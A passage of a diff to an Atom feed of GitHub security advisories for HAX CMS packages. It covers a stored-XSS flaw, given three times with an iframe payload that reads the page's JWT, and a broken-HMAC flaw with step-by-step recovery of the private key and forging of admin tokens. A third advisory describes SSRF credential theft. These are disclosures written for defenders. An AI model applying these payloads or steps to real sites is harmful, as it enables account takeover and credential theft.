+<p>The application allows <code>javascript:</code> URIs in the <code>src</code> attribute, which are executed when a malicious page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data exposed to client-side scripts.</p>
+<h3 id="details">Details</h3>
+<p>Successful exploitation allows access to any data available in the browser context, including:</p>
+<ul>
+<li>Authentication tokens (e.g., JWT)</li>
+<li>Session cookies (if not protected with HttpOnly)</li>
+<li>Application configuration (e.g., window.appSettings)</li>
+<li>User-specific data accessible via APIs</li>
+</ul>
+<p>This significantly increases the impact beyond simple script execution.</p>
+<h3 id="poc">PoC</h3>
+<p>Steps to reproduce:</p>
+<ol>
+<li>Log in to HAX CMS as any authenticated user.</li>
+<li>Create a new page or edit an existing page.</li>
+<li>Open the HTML source editor (<code>&lt;&gt;</code>).</li>
+<li>Insert the following payload:</li>
+</ol>
+<pre><code class="language-html">&lt;iframe srcdoc="&amp;lt;script&amp;gt;
+    (function(){
+        try {
+            var jwt = parent.window.appSettings.jwt;
+            alert('Stolen JWT:\n' + jwt);
+        } catch(e) {
+            alert('Error: ' + e.message);
+        }
+    })();
+&amp;lt;/script&amp;gt;" style="display:none" sandbox="allow-scripts allow-same-origin"&gt;&lt;/iframe&gt;
+</code></pre>
+<img src="https://github.com/user-attachments/assets/daea3b41-8c72-4f6c-ab32-34c688bbd251" alt="image" height="1319" width="2446">
+
+
+<img src="https://github.com/user-attachments/assets/911cbd42-db50-454a-b178-51555e0db79c" alt="image" height="1397" width="2464">
+
+
+
+<img src="https://github.com/user-attachments/assets/8a286435-98f4-418c-a596-d0c19556696a" alt="webhook`" height="1409" width="2466">
+
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows stored XSS leading to:</p>
+<ul>
+<li>Execution of arbitrary JavaScript in victim browsers</li>
+<li>Access to sensitive client-side data, including authentication tokens and session identifiers</li>
+<li>Unauthorized API actions performed on behalf of the victim</li>
+<li>Session hijacking and full account takeover</li>
+</ul>
+<p>Because the application exposes authentication data in the client-side environment, exploitation of this vulnerability can lead to complete compromise of user accounts and site content.</p>
 <h3 id="references">References</h3>
 <ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45222">https://nvd.nist.gov/vuln/detail/CVE-2026-45222</a></li>
-<li><a href="https://github.com/steipete/summarize/pull/214">https://github.com/steipete/summarize/pull/214</a></li>
-<li><a href="https://github.com/steipete/summarize/commit/0cfb0fb99777a87a7b02082b5e4bd449f8dd6175">https://github.com/steipete/summarize/commit/0cfb0fb99777a87a7b02082b5e4bd449f8dd6175</a></li>
-<li><a href="https://www.vulncheck.com/advisories/summarize-insecure-daemon-configuration-file-permissions">https://www.vulncheck.com/advisories/summarize-insecure-daemon-configuration-file-permissions</a></li>
-<li><a href="https://github.com/steipete/summarize/releases/tag/v0.15.0">https://github.com/steipete/summarize/releases/tag/v0.15.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-qp7v-gjgg-4mj6">https://github.com/advisories/GHSA-qp7v-gjgg-4mj6</a></li>
+<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36</a></li>
+<li><a href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/advisories/GHSA-jh3h-rpxg-fr36</a></li>
 </ul>
 ]]></content>
         <author>
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qp7v-gjgg-4mj6</uri>
+            <uri>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</uri>
         </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-11T21:31:34.000Z</published>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-19T14:46:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@haxtheweb/video-player] Stored XSS via <iframe> in HAX CMS allows access to sensitive client-side data and account takeover]]></title>
+        <id>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</id>
+        <link href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36"/>
+        <updated>2026-05-19T14:46:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of <code>&lt;iframe&gt;</code> elements.</p>
+<p>The application allows <code>javascript:</code> URIs in the <code>src</code> attribute, which are executed when a malicious page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data exposed to client-side scripts.</p>
+<h3 id="details">Details</h3>
+<p>Successful exploitation allows access to any data available in the browser context, including:</p>
+<ul>
+<li>Authentication tokens (e.g., JWT)</li>
+<li>Session cookies (if not protected with HttpOnly)</li>
+<li>Application configuration (e.g., window.appSettings)</li>
+<li>User-specific data accessible via APIs</li>
+</ul>
+<p>This significantly increases the impact beyond simple script execution.</p>
+<h3 id="poc">PoC</h3>
+<p>Steps to reproduce:</p>
+<ol>
+<li>Log in to HAX CMS as any authenticated user.</li>
+<li>Create a new page or edit an existing page.</li>
+<li>Open the HTML source editor (<code>&lt;&gt;</code>).</li>
+<li>Insert the following payload:</li>
+</ol>
+<pre><code class="language-html">&lt;iframe srcdoc="&amp;lt;script&amp;gt;
+    (function(){
+        try {
+            var jwt = parent.window.appSettings.jwt;
+            alert('Stolen JWT:\n' + jwt);
+        } catch(e) {
+            alert('Error: ' + e.message);
+        }
+    })();
+&amp;lt;/script&amp;gt;" style="display:none" sandbox="allow-scripts allow-same-origin"&gt;&lt;/iframe&gt;
+</code></pre>
+<img src="https://github.com/user-attachments/assets/daea3b41-8c72-4f6c-ab32-34c688bbd251" alt="image" height="1319" width="2446">
+
+
+<img src="https://github.com/user-attachments/assets/911cbd42-db50-454a-b178-51555e0db79c" alt="image" height="1397" width="2464">
+
+
+
+<img src="https://github.com/user-attachments/assets/8a286435-98f4-418c-a596-d0c19556696a" alt="webhook`" height="1409" width="2466">
+
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows stored XSS leading to:</p>
+<ul>
+<li>Execution of arbitrary JavaScript in victim browsers</li>
+<li>Access to sensitive client-side data, including authentication tokens and session identifiers</li>
+<li>Unauthorized API actions performed on behalf of the victim</li>
+<li>Session hijacking and full account takeover</li>
+</ul>
+<p>Because the application exposes authentication data in the client-side environment, exploitation of this vulnerability can lead to complete compromise of user accounts and site content.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36</a></li>
+<li><a href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/advisories/GHSA-jh3h-rpxg-fr36</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-19T14:46:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] Stored XSS via <iframe> in HAX CMS allows access to sensitive client-side data and account takeover]]></title>
+        <id>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</id>
+        <link href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36"/>
+        <updated>2026-05-19T14:46:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of <code>&lt;iframe&gt;</code> elements.</p>
+<p>The application allows <code>javascript:</code> URIs in the <code>src</code> attribute, which are executed when a malicious page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data exposed to client-side scripts.</p>
+<h3 id="details">Details</h3>
+<p>Successful exploitation allows access to any data available in the browser context, including:</p>
+<ul>
+<li>Authentication tokens (e.g., JWT)</li>
+<li>Session cookies (if not protected with HttpOnly)</li>
+<li>Application configuration (e.g., window.appSettings)</li>
+<li>User-specific data accessible via APIs</li>
+</ul>
+<p>This significantly increases the impact beyond simple script execution.</p>
+<h3 id="poc">PoC</h3>
+<p>Steps to reproduce:</p>
+<ol>
+<li>Log in to HAX CMS as any authenticated user.</li>
+<li>Create a new page or edit an existing page.</li>
+<li>Open the HTML source editor (<code>&lt;&gt;</code>).</li>
+<li>Insert the following payload:</li>
+</ol>
+<pre><code class="language-html">&lt;iframe srcdoc="&amp;lt;script&amp;gt;
+    (function(){
+        try {
+            var jwt = parent.window.appSettings.jwt;
+            alert('Stolen JWT:\n' + jwt);
+        } catch(e) {
+            alert('Error: ' + e.message);
+        }
+    })();
+&amp;lt;/script&amp;gt;" style="display:none" sandbox="allow-scripts allow-same-origin"&gt;&lt;/iframe&gt;
+</code></pre>
+<img src="https://github.com/user-attachments/assets/daea3b41-8c72-4f6c-ab32-34c688bbd251" alt="image" height="1319" width="2446">
+
+
+<img src="https://github.com/user-attachments/assets/911cbd42-db50-454a-b178-51555e0db79c" alt="image" height="1397" width="2464">
+
+
+
+<img src="https://github.com/user-attachments/assets/8a286435-98f4-418c-a596-d0c19556696a" alt="webhook`" height="1409" width="2466">
+
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows stored XSS leading to:</p>
+<ul>
+<li>Execution of arbitrary JavaScript in victim browsers</li>
+<li>Access to sensitive client-side data, including authentication tokens and session identifiers</li>
+<li>Unauthorized API actions performed on behalf of the victim</li>
+<li>Session hijacking and full account takeover</li>
+</ul>
+<p>Because the application exposes authentication data in the client-side environment, exploitation of this vulnerability can lead to complete compromise of user accounts and site content.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36</a></li>
+<li><a href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/advisories/GHSA-jh3h-rpxg-fr36</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-19T14:46:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HAXcms: Private Key Disclosure via Broken HMAC Implementation]]></title>
+        <id>https://github.com/advisories/GHSA-6c8g-9hfh-pq5h</id>
+        <link href="https://github.com/advisories/GHSA-6c8g-9hfh-pq5h"/>
+        <updated>2026-05-19T14:44:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>hmacBase64()</code> function in the HAXcms Node.js backend contains two critical cryptographic implementation errors that together allow any unauthenticated attacker to extract the system’s private signing key and forge arbitrary admin-level JSON Web Tokens (JWTs) allowing them to get full admin access with a single HTTP request.</p>
+<h3 id="details">Details</h3>
+<p>Bug 1: Hardcoded HMAC Key (line 2160): The function passes the literal string "0" as the HMAC signing key instead of the key parameter, making every HAXcms instance compute identical HMACs for the same input.</p>
+<p>Bug 2: Private Key Appended to Output (lines 2161- 2163): After computing the HMAC, the function concatenates the real key parameter which is "this.privateKey + this.salt", the system’s master signing secret is directly onto the output. The combined buffer is base64-encoded and returned as the token.</p>
+<p>Every base64url token produced has the same structure: 32 bytes HMAC keyed with "0" and N bytes of <code>privateKey+salt</code>. An attacker base64-decodes any token, discards the first 32 bytes, and reads the private key directly.</p>
+<p>The <code>/system/api/connectionSettings</code> endpoint is unauthenticated and returns multiple tokens generated by this function. A single GET request to this endpoint exposes the private key.</p>
+<p>The PHP backend (HAXCMS.php:1619-1631) implements this function correctly with the actual key and returns only the hash. The PHP version produces 44-character tokens whereas the broken Node.js version produces 139+ character tokens.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>GET request to <code>/system/api/connectionSettings</code> endpoint and fetch the token.</li>
+<li>Extract the private key from the fetched token. The <code>hmacBase64()</code> function produces 32 bytes with HMAC-SHA256 with hardcoded key "0" and the rest of the bytes are <code>privateKey+salt</code> (plaintext). Decode the Base64 token, discard the first 32 bytes, read the remaining bytes as UTF-8 (this is your extracted private key).</li>
+<li>Since JWT's are signed with <code>privateKey+salt</code>, use this stolen private key to forge a JWT for admin using <code>JWT.sign(payload, this.privateKey+this.salt)</code>. NOTE: the payload uses {id, user (set this as admin), iat (current timestamp), exp (expiration timestamp)}</li>
+<li>The same key can also be used to create other tokens (user_token, base_token, form_token, etc).</li>
+<li>Use these forged tokens to hit all authenticated endpoints (modify/delete/create etc) with admin privileges.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker can perform the complete attack chain with a single HTTP request:</p>
+<ol>
+<li>Extract private key: GET "/system/api/connectionSettings", base64-decode any token, discard first 32 bytes.</li>
+<li>Forge admin JWT: sign arbitrary JWT payloads with the stolen privateKey+salt.</li>
+<li>Forge all request tokens: compute valid user_token, site_token for any API call.</li>
+<li>Full admin access: create/modify/delete sites, upload files, modify content.</li>
+</ol>
+<p>This works even if the admin has changed the default credentials to a strong password. The forged tokens produce no login events in logs.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-6c8g-9hfh-pq5h">https://github.com/haxtheweb/issues/security/advisories/GHSA-6c8g-9hfh-pq5h</a></li>
+<li><a href="https://github.com/advisories/GHSA-6c8g-9hfh-pq5h">https://github.com/advisories/GHSA-6c8g-9hfh-pq5h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6c8g-9hfh-pq5h</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-19T14:44:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@haxtheweb/open-apis] HAX open-apis: Credential Theft via Server-Side Request Forgery (SSRF) in open-apis]]></title>
+        <id>https://github.com/advisories/GHSA-4fg7-f244-3j49</id>
+        <link href="https://github.com/advisories/GHSA-4fg7-f244-3j49"/>
+        <updated>2026-05-19T14:44:47.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Multiple functions conduct substring-only matching to validate hostnames to which basic authorization should be sent. An attacker can append the matched substrings to an attacker-controlled endpoint and capture authentication.</p>
+<h3 id="details">Details</h3>
+<p><a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/services/website/cacheAddress.js#L21">api/services/website/cacheAddress.js</a>, <a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/apps/haxcms/lib/JOSHelpers.js#L26">api/apps/haxcms/lib/JOSHelpers.js</a>, and <a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/apps/haxcms/convert/elmslnToSite.js#L37">api/apps/haxcms/convert/elmslnToSite.js</a> use similar logic to check for hard-coded site names. However, the logic only looks for the substring to be included in the user-controlled string, allowing an attacker to craft an API call and extract the credentials intended for the hard-coded domains.</p>
+<h3 id="poc">PoC</h3>
+<p>Making API calls to an affected endpoint will result in credential theft. The attacker-controlled domains in these proofs of concept are <code>cloudflared</code> tunnels, protecting the production credentials from unencrypted exposure.</p>
+<p>cacheAddress.js:
+<img src="https://github.com/user-attachments/assets/0a87cef5-3c4d-450a-8bb7-35123d5f621b" alt="ssrf_cred_theft" height="1656" width="3404"></p>
+<p>elmslnToSite.js:
+<img src="https://github.com/user-attachments/assets/bede82cc-a613-4fc7-bbf6-76166af784f5" alt="theft2" height="1641" width="3409"></p>
+<p>JOSHelpers.js:
+<img src="https://github.com/user-attachments/assets/4f3f8bee-443e-4b22-9d41-eb9726619d36" alt="theft3" height="1597" width="3407"></p>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows internal data, including secrets, to be exfiltrated to an attacker-controlled domain. Credentials were confirmed with the maintainer to grant access to unreleased LMS content on subsequent systems; out of scope for PoC.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-4fg7-f244-3j49">https://github.com/haxtheweb/issues/security/advisories/GHSA-4fg7-f244-3j49</a></li>
+<li><a href="https://github.com/advisories/GHSA-4fg7-f244-3j49">https://github.com/advisories/GHSA-4fg7-f244-3j49</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4fg7-f244-3j49</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-19T14:44:46.000Z</published>
     </entry>
 </feed>
